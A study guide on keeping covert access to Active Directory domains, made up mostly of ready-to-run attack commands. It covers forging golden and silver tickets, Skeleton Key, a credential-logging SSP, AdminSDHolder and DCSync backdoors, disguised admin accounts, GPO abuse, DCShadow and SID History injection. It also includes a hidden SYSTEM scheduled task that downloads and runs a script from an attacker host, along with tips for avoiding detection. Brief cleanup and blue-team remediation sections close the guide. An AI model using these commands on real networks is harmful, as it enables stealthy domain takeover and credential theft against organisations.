# AD Persistence Study Guide

Comprehensive guide for establishing and maintaining access in Active Directory environments.

## Part 1: Credential-Based Persistence

### Golden Ticket Persistence

Golden Tickets remain valid until the krbtgt account password is changed twice.

#### Creating Long-Term Golden Tickets

```bash
# Linux - Create with 10-year validity (default)
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -duration 3650 \
  Administrator

# Store securely
export KRB5CCNAME=/secure/location/golden.ccache
```

```powershell
# Windows - Create and save
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH /ticket:C:\secure\golden.kirbi

# Create for non-existent user (harder to detect)
mimikatz # kerberos::golden /user:helpdesk-backup /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH /id:1337 /groups:512,513,518,519,520 \
  /ticket:C:\secure\hidden_golden.kirbi
```

#### Golden Ticket Best Practices

- Use for impersonation of accounts that exist (looks legitimate)
- Avoid creating tickets with impossible group combinations
- Store tickets securely, encrypted at rest
- Refresh tickets periodically to avoid detection by age

---

### Silver Ticket Persistence

Silver Tickets are stealthier as they don't contact the KDC.

#### Strategic Silver Tickets

```bash
# Create Silver Tickets for critical services

# 1. CIFS for file access on DCs and servers
ticketer.py -nthash DC01_HASH -domain-sid SID -domain domain.local \
  -spn CIFS/dc01.domain.local Administrator

# 2. LDAP for directory queries
ticketer.py -nthash DC01_HASH -domain-sid SID -domain domain.local \
  -spn LDAP/dc01.domain.local Administrator

# 3. HOST for WMI and scheduled tasks
ticketer.py -nthash FILESERVER_HASH -domain-sid SID -domain domain.local \
  -spn HOST/fileserver.domain.local Administrator

# 4. HTTP for WinRM/PSRemoting
ticketer.py -nthash WEB01_HASH -domain-sid SID -domain domain.local \
  -spn HTTP/web01.domain.local Administrator
```

#### Silver Ticket Persistence Strategy

Create and store Silver Tickets for all critical servers:
- All Domain Controllers (CIFS, LDAP, HOST)
- File servers (CIFS)
- Database servers (MSSQLSvc)
- Application servers (HTTP, HOST)

---

### Skeleton Key

Skeleton Key provides universal authentication but is temporary.

```powershell
# On Domain Controller
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Default password: mimikatz
# All accounts now accept "mimikatz" as password
```

**Limitations:**
- Non-persistent (cleared on DC reboot)
- Must be installed on each DC
- Detectable via LSASS memory analysis

---

### Custom Security Support Provider (SSP)

Install a malicious SSP to capture all credentials.

```powershell
# Mimikatz includes mimilib.dll as an SSP
# This logs all credentials to C:\Windows\System32\kiwissp.log

# Method 1: Memory injection (non-persistent)
mimikatz # privilege::debug
mimikatz # misc::memssp

# Method 2: Registry installation (persistent across reboots)
# Copy mimilib.dll to C:\Windows\System32\

# Add to SSP list
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# Reboot required for persistence method
```

**Detection:**
- Monitor registry key: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
- Watch for new DLLs in System32
- Monitor for credential log files

---

## Part 2: ACL-Based Persistence

### AdminSDHolder Abuse

AdminSDHolder ACL is applied to all protected groups every 60 minutes.

#### Add Backdoor to AdminSDHolder

```powershell
# PowerView - Add full control for attacker user
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All -Verbose

# Or just specific rights
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
  -PrincipalIdentity backdoor_user -Rights ResetPassword,WriteMembers -Verbose
```

```bash
# Using dacledit.py (Impacket)
dacledit.py -action write -principal backdoor_user -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
  -rights FullControl domain.local/admin:password
```

#### Result After SDProp Runs

After 60 minutes (or manual trigger), backdoor_user will have the specified rights on:
- Domain Admins group (can add themselves)
- Enterprise Admins
- Schema Admins
- Administrators
- All other protected objects

#### Manually Trigger SDProp

```powershell
# Force SDProp to run immediately
Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1

# Or via ldp.exe:
# 1. Connect to DC
# 2. Bind as Domain Admin
# 3. Modify DN: CN=AdminSDHolder,CN=System,DC=domain,DC=local
# 4. Add attribute: fixupInheritance = 1
```

---

### DCSync Rights Persistence

Grant a user DCSync rights for permanent credential access.

```powershell
# PowerView - Add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync -Verbose

# Verify
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -match 'DS-Replication-Get-Changes')
}
```

```bash
# Using dacledit.py
dacledit.py -action write -principal backdoor_user -target "DC=domain,DC=local" \
  -rights DCSync domain.local/admin:password

# Now backdoor_user can DCSync
secretsdump.py domain.local/backdoor_user:password@dc01.domain.local -just-dc
```

---

### Object ACL Modification

Add hidden permissions on critical objects.

```powershell
# Add GenericAll on Domain Admins group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity backdoor_user -Rights All

# Add password reset rights on specific admin
Add-DomainObjectAcl -TargetIdentity admin_account -PrincipalIdentity backdoor_user -Rights ResetPassword

# Add write rights on computer for RBCD
Add-DomainObjectAcl -TargetIdentity TARGET_COMPUTER$ -PrincipalIdentity backdoor_user -Rights WriteProperty
```

---

## Part 3: Object-Based Persistence

### Hidden Admin Accounts

Create accounts with admin privileges not visible in obvious places.

```powershell
# Create user with misleading name
New-ADUser -Name "Exchange Health" -SamAccountName "ExchangeHealth" -UserPrincipalName "exchangehealth@domain.local" -AccountPassword (ConvertTo-SecureString 'Str0ngP@ss!' -AsPlainText -Force) -Enabled $true

# Don't add to Domain Admins (too obvious)
# Instead, add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity ExchangeHealth -Rights DCSync

# Or add to AdminSDHolder for delayed privilege
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity ExchangeHealth -Rights All
```

### Machine Account Persistence

Create privileged machine accounts.

```bash
# Create machine account
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' \
  domain.local/admin:password -dc-ip 192.168.1.10

# Add to privileged groups (unusual but possible)
# Or grant DCSync rights to machine account
```

---

## Part 4: Configuration-Based Persistence

### GPO-Based Persistence

Group Policy offers powerful persistence options.

#### Scheduled Task via GPO

```powershell
# Create GPO
New-GPO -Name "WindowsUpdate-Helper"

# Link to Domain Computers or specific OU
New-GPLink -Name "WindowsUpdate-Helper" -Target "OU=Servers,DC=domain,DC=local"

# Add scheduled task via Group Policy Preferences
# Uses: Computer Configuration > Preferences > Control Panel Settings > Scheduled Tasks
```

#### Logon Script via GPO

```powershell
# Copy malicious script to SYSVOL
Copy-Item C:\payload.ps1 \\domain.local\SYSVOL\domain.local\scripts\update.ps1

# Configure GPO
# User Configuration > Policies > Windows Settings > Scripts > Logon
```

#### Using SharpGPOAbuse

```powershell
# Add local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount backdoor_user --GPOName "Default Domain Policy"

# Add startup script
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net user backdoor Password123 /add" --GPOName "Default Domain Policy"

# Add scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123 /add" --GPOName "Default Domain Policy"
```

---

### Scheduled Task Persistence

```powershell
# On target system with admin rights
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c "IEX(IWR http://attacker/payload.ps1)"'
$Trigger = New-ScheduledTaskTrigger -Daily -At 9am
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
```

---

### Service Installation

```powershell
# Create malicious service
sc.exe create "WindowsUpdateSvc" binPath= "C:\Windows\System32\backdoor.exe" start= auto
sc.exe description "WindowsUpdateSvc" "Windows Update Helper Service"
sc.exe start "WindowsUpdateSvc"
```

---

## Part 5: Advanced Persistence

### DCShadow

DCShadow registers a rogue DC to push changes stealthily.

```powershell
# Mimikatz - DCShadow attack
# Terminal 1: Start RPC server (as SYSTEM on domain-joined machine)
mimikatz # lsadump::dcshadow /object:backdoor_user /attribute:primaryGroupID /value:512

# Terminal 2: Push the change (as Domain Admin)
mimikatz # lsadump::dcshadow /push
```

**Possible DCShadow modifications:**
- Add user to admin group
- Modify SID History
- Change password hashes
- Modify any AD attribute

---

### SID History Injection

Add privileged SIDs to a user's SID History.

```powershell
# Mimikatz
mimikatz # privilege::debug
mimikatz # sid::patch
mimikatz # sid::add /sam:backdoor_user /new:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-512

# User now has Domain Admins SID in their history
# Access tokens include SID History SIDs
```

```bash
# With DCShadow (stealthier)
mimikatz # lsadump::dcshadow /object:backdoor_user /attribute:sIDHistory /value:S-1-5-21-XXXX-XXXX-XXXX-512
mimikatz # lsadump::dcshadow /push
```

---

### Primary Group ID Modification

Change user's primary group to Domain Admins (won't show in memberOf).

```powershell
# Note: User must be member of target group first
Set-ADUser -Identity backdoor_user -Replace @{primaryGroupID=512}

# Now remove from Domain Admins memberOf
# User still has DA rights via primaryGroupID
```

---

## Part 6: Persistence Cleanup

### For Red Team Operations

Always clean up persistence before engagement end:

```powershell
# Document all persistence mechanisms with timestamps
# Remove in reverse order of installation

# Remove AdminSDHolder ACE
Remove-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity backdoor_user -Rights All

# Remove DCSync rights
Remove-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync

# Delete created accounts
Remove-ADUser -Identity backdoor_user

# Remove scheduled tasks
Unregister-ScheduledTask -TaskName "WindowsUpdateHelper" -Confirm:$false

# Delete malicious services
sc.exe delete "WindowsUpdateSvc"

# Revert GPO changes
# Delete malicious GPOs
```

### For Blue Team Remediation

```powershell
# 1. Reset krbtgt twice (with replication time between)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss1' -AsPlainText -Force)
# Wait for replication (at least 10 hours)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss2' -AsPlainText -Force)

# 2. Audit AdminSDHolder
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs

# 3. Check DCSync rights
Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'DS-Replication' }

# 4. Audit SID History
Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -ne $null }

# 5. Check Security Packages
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages"

# 6. Review GPOs
Get-GPO -All | ForEach-Object { Get-GPOReport -Guid $_.Id -ReportType Html -Path "C:\GPOAudit\$($_.DisplayName).html" }
```

---

## Quick Reference

### Credential-Based
```
Golden Ticket: ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
Skeleton Key: mimikatz # misc::skeleton
Custom SSP: Copy mimilib.dll, modify registry
```

### ACL-Based
```
AdminSDHolder: Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity USER -Rights All
DCSync Rights: Add-DomainObjectAcl -TargetIdentity "DC=X,DC=X" -PrincipalIdentity USER -Rights DCSync
```

### Configuration-Based
```
GPO: SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USER --GPOName "GPO"
Scheduled Task: schtasks /create /tn "Name" /tr "command" /sc daily /ru SYSTEM
```

### Advanced
```
SID History: mimikatz # sid::add /sam:USER /new:DA_SID
DCShadow: mimikatz # lsadump::dcshadow /object:USER /attribute:ATTR /value:VAL
```
